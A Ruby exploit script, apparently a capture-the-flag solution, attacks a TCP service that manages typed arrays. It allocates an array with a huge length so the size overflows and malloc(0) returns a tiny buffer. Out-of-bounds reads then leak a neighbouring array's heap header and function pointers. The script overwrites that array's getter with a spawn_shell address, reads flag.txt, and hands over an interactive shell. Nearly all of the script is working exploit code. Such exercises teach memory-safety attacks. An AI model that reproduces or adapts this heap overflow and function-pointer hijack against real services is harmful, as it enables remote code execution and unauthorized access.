#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end

host = ARGV[0]
port = ARGV[1]
$s = TCPSocket.new host, port



def list
    command = "list"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def init id, type, length
    command = "init #{id} #{type} #{length}"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def delete id
    command = "delete #{id}"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def set id, index, value
    command = "set #{id} #{index} #{value}"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def get id, index
    command = "get #{id} #{index}"
    puts command
    $s.puts command
    print answer = $s.expect("\n> ")[0]
    answer[/^\d*/].to_i
end

def quit
    command = "quit"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end


SPAWN_SHELL = 0x4009c3

print $s.expect("\n> ")[0]

# malloc(0) allocates 24 Bytes
init 'A', 64, 2**61

# allocate 'victim' buffer
init 'B', 64, 10


# Leaking array B
chunk  = get 'A', 3
length = get 'A', 4
type   = get 'A', 5
data   = get 'A', 6
getter = get 'A', 7
setter = get 'A', 8
puts
log("Chunk header: #{[chunk].pack('Q>')}")
log("Lenght: #{length}")
log("Type: #{type}")
log("Data: 0x#{data.to_s(16)}")
log("Getter: 0x#{getter.to_s(16)}")
log("Setter: 0x#{setter.to_s(16)}")
print "> "


# Overwrite getter of B with SPAWN_SHELL
set 'A', 7, SPAWN_SHELL

# Call spawn_shell()
$s.puts "get B 0"


sleep 1
$s.puts "cat flag.txt"

$s.interact
